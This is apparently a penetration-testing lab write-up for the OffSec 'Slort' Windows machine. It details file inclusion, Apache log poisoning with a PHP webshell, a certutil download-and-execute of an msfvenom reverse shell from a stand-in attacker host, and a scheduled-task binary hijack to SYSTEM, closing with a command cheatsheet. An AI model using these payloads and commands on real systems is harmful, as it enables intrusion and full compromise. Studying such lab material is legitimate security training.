![Slort attack path](/images/lab-writeups/slort.svg)

# Slort Write-Up

Source: OffSec

Difficulty: Intermediate

Categories: Windows, XAMPP, LFI, RFI, log poisoning, certutil, scheduled task binary hijack

## Attack Chain

```text
nmap
-> dual HTTP ports on 4443 and 8080
-> both serve XAMPP
-> gobuster finds /site
-> index.php?page=main.php indicates include()
-> LFI test fails loudly but reveals webroot
-> RFI confirmed
-> two-stage RFI payload downloads and executes a Windows reverse shell
-> Apache log poisoning also works as an LFI-to-RCE bridge
-> shell as rupert
-> filesystem enumeration
-> winPEAS finds C:\Backup\TFTP.EXE writable by Users
-> scheduled task runs that binary as SYSTEM every 5 minutes
-> replace binary
-> wait for scheduled task
-> SYSTEM shell
```

## Principle 1: Failed LFI as Reconnaissance

When LFI fails with a verbose PHP error, it can still be a useful result.

Example error:

```text
Warning: include(../../../../../../../etc/passwd): failed to open stream:
No such file or directory in C:\xampp\htdocs\site\index.php on line 4
```

This reveals:

- The exact webroot: `C:\xampp\htdocs\site\`
- The vulnerable file: `index.php`
- The vulnerable function: `include()`
- The operating system: Windows
- The line number: line 4
- The fact that user input is reaching the include call

The correct interpretation is not "LFI failed." The correct interpretation is "the include primitive is confirmed and the server provided the filesystem anchor."

From `C:\xampp\htdocs\site\`, paths can be calculated precisely. For example, the Apache access log is reachable relative to the webroot through:

```text
../../apache/logs/access.log
```

## Principle 2: Include() Vulnerability Spectrum

PHP `include()` accepts a file path and executes PHP if the included content contains PHP code.

The same vulnerable pattern can become:

- LFI: local file inclusion.
- RFI: remote file inclusion, if `allow_url_include` is enabled.
- LFI-to-RCE: log poisoning, session poisoning, upload chaining, or stream wrappers.

The test sequence is:

1. Find a parameter such as `?page=`.
2. Test LFI with a Windows path such as `../../../../windows/win.ini`.
3. If the error is verbose, read it carefully.
4. Test RFI with a hosted file under attacker control.
5. If RFI works, use a two-stage payload.
6. If RFI fails but LFI works, use log poisoning or another bridge.

## Principle 3: Apache Log Poisoning

Apache logs user-controlled headers such as User-Agent. If the log file can be included by PHP, injected PHP code in the log can execute.

Injection:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target:8080/
```

Execution:

```bash
curl "http://target/site/index.php?page=../../apache/logs/access.log&cmd=whoami"
```

This generalizes beyond Apache. Any log file that records attacker-controlled input and is readable through LFI can become a code execution bridge.

## Principle 4: phpinfo as Intelligence

phpinfo is useful but not required before testing LFI and RFI.

Useful fields:

- `allow_url_fopen`
- `allow_url_include`
- `disable_functions`
- `open_basedir`
- `session.save_path`
- `session.upload_progress.enabled`
- `upload_tmp_dir`
- `DOCUMENT_ROOT`
- Environment variables

On XAMPP, phpinfo is often available at:

```text
/dashboard/phpinfo.php
```

It may also be reachable through LFI:

```text
?page=C:/xampp/htdocs/dashboard/phpinfo.php
```

## Principle 5: Two-Layer Security Model

PHP restrictions and Windows OS behavior are separate layers.

Even if PHP has restrictions around remote includes, PHP may still call Windows-native binaries through `system()`, `exec()`, or similar functions if they are enabled.

This is why `certutil` is useful:

- It is a signed Microsoft binary.
- It can download files.
- It bypasses PHP URL include restrictions because the download happens at the OS layer.

The two-stage payload approach:

1. Stage 1: PHP calls `certutil` to download a native Windows payload.
2. Stage 2: PHP executes the payload from disk.

The resulting shell is a normal Windows process, not a PHP session.

## Foothold Path A: RFI

Generate a native payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<tun0> LPORT=135 -f exe > rev.exe
```

Stage 1 downloads the payload:

```php
<?php system("certutil -urlcache -f http://ATTACKER/rev.exe C:\\Windows\\Temp\\rev.exe"); ?>
```

Stage 2 executes it:

```php
<?php system("C:\\Windows\\Temp\\rev.exe"); ?>
```

Serve both PHP files and the executable with a Python HTTP server, trigger Stage 1, verify the file lands, start a listener, then trigger Stage 2.

## Foothold Path B: Log Poisoning

If RFI fails but LFI works:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target:8080/
```

Then:

```text
?page=../../apache/logs/access.log&cmd=whoami
```

Once command execution is confirmed, use the same certutil download-and-execute method.

## Post-Shell Orientation

Immediately after landing a Windows shell:

```cmd
dir C:\
dir C:\Users\
dir C:\Users\<currentuser>\
whoami /priv
whoami /groups
```

Important areas:

- `C:\` for non-standard directories such as `C:\Backup`, `C:\Tools`, or `C:\Scripts`.
- `C:\Users\` for local users.
- Current user profile for notes, scripts, SSH keys, or credentials.

## Privilege Escalation: Scheduled Task Binary Hijack

winPEAS identified:

```text
C:\Backup\TFTP.EXE
Users [AllAccess]
```

The system had a scheduled task that executed this binary as SYSTEM every five minutes.

Verification commands:

```cmd
icacls C:\Backup\TFTP.EXE
schtasks /query /fo LIST /v | findstr /i "tftp"
```

Attack:

1. Generate a replacement executable.
2. Upload it over the existing shell.
3. Replace `TFTP.EXE`.
4. Start a listener.
5. Wait for the scheduled task to run.

## Community Insights

The HTTP services on ports 4443 and 8080 served the same app. One directory scan was enough.

SMB-based RFI can be tested if HTTP egress fails:

```text
?page=\\ATTACKER\smb\shell.php
```

Traditional Linux-oriented PHP reverse shells may not work on Windows XAMPP. A native Windows executable payload is more reliable.

`C:\Backup\info.txt` and similar operational notes are worth reading because they often describe scheduled task behavior directly.

## Cheatsheet

```bash
nmap -Pn -n $IP -sC -sV -p- --open
gobuster dir -u http://$IP:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
curl -i "http://$IP/site/index.php?page=../../../../windows/win.ini"
curl -A "<?php system(\$_GET['cmd']); ?>" http://$IP:8080/
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe > rev.exe
python3 -m http.server 80
rlwrap nc -nvlp 443
```

## Lessons Learned

Verbose errors are enumeration output.

The document root is the anchor for precise path traversal.

LFI and RFI are different outcomes of the same unsafe include pattern.

Log poisoning is a reliable LFI-to-RCE bridge when the log is writable by requests and readable by the include primitive.

Scheduled tasks convert writable files into delayed code execution when the scheduled task runs with higher privileges.
